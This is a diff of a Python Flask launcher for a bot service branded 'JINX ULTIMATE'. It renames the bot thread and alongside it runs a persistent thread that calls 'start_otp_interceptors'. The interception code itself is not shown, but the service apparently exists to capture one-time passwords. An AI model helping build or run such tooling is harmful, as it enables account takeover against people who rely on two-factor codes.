@@ -1,9 +1,7 @@
 import os
-import asyncio
 import threading
 from flask import Flask
 import logging
-import time
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -12,30 +10,30 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "🔥 JINX ULTIMATE - DEBUG BOT ACTIVE! 😈"
+    return "🔥 JINX ULTIMATE - SUPER SIMPLE BOT! 😈"
 
 @app.route('/health')
 def health():
     return {"status": "healthy", "service": "jinx"}
 
-def run_debug_bot():
-    """Run DEBUG bot"""
+def run_super_simple_bot():
+    """Run SUPER SIMPLE bot"""
     try:
-        from debug_bot import main
-        asyncio.run(main())
+        from super_simple_bot import main
+        main()
     except Exception as e:
-        logger.error(f"Debug bot error: {e}")
-        time.sleep(5)
-        run_debug_bot()
+        logger.error(f"Super simple bot error: {e}")
 
 def run_interceptors():
     """Run interceptors"""
     while True:
         try:
             from otp_interceptor import start_otp_interceptors
+            import asyncio
             asyncio.run(start_otp_interceptors())
         except Exception as e:
             logger.error(f"Interceptor crashed: {e}")
+            import time
             time.sleep(10)
 
 if __name__ == "__main__":
@@ -56,13 +54,13 @@ if __name__ == "__main__":
         logger.error(f"❌ API routes setup failed: {e}")
 
     # Start services
-    bot_thread = threading.Thread(target=run_debug_bot, daemon=True)
+    bot_thread = threading.Thread(target=run_super_simple_bot, daemon=True)
     interceptor_thread = threading.Thread(target=run_interceptors, daemon=True)
     
     bot_thread.start()
     interceptor_thread.start()
     
-    logger.info("🤖 DEBUG BOT STARTED!")
+    logger.info("🤖 SUPER SIMPLE BOT STARTED!")
     
     # Run Flask
     port = int(os.environ.get("PORT", 5000))
